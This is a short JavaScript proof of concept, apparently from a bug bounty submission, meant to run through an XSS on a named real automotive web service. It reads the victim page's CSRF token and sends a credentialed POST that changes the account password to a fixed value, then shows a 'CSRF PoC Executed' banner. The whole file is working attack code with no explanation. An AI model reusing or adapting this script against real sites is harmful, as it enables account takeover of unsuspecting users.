// CSRF PoC - External JS for XSS
(function() {
    'use strict';
    
    const csrfToken = document.getElementById('CSRFToken').value;
    const formData = new URLSearchParams();
    
    // Add all parameters
    const params = {
        'dividerPos': '0',
        'mouseX': '1065', 
        'mouseY': '280',
        'focusElement': 'userPasswordNew2',
        'browser': '-422d1c48:19acb3cc742:-7da6$1',
        'control': '43694',
        'event': 'click',
        'eventValue': '',
        'CSRFToken': csrfToken,
        'submit': 'Submit Query',
        'j_43697': 'nay',
        'j_43699': 'naysserkk',
        'j_43701': 'leo',
        'j_43704': 'naysser<',
        'j_43708': 'wearehackerone',
        'j_43710': '',
        'j_43715': 'naysser"',
        'j_43717': 'nasserwashere@wearehackerone.com',
        'j_43719': '+1202654784',
        'j_43721': '',
        'j_43723': '',
        'j_43725': '',
        'j_43727': '',
        'j_43729': '',
        'j_43731': '',
        'j_43734': 'Wisdome@1992',
        'j_43736': 'Wisdome@1992',
        'j_43739': 'true',
        'j_43747': '',
        'j_43749': '0:0',
        'j_43761': '',
        'j_43688': '0',
        'j_43685': '0',
        'j_43695': 'Frau',
        'formScrollPos': '0',
        'domainScrollPos': '0'
    };
    
    Object.keys(params).forEach(key => formData.append(key, params[key]));
    
    fetch('https://osa2.audi.de/ve/ns_content.jsp', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: formData,
        credentials: 'include'
    }).then(r => {
        const n = document.createElement('div');
        n.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#ff4444;color:white;padding:15px;border-radius:5px;z-index:10000;font-family:Arial;';
        n.innerHTML = 'CSRF PoC Executed! Status: ' + r.status;
        document.body.appendChild(n);
        setTimeout(() => n.remove(), 5000);
    });
})();
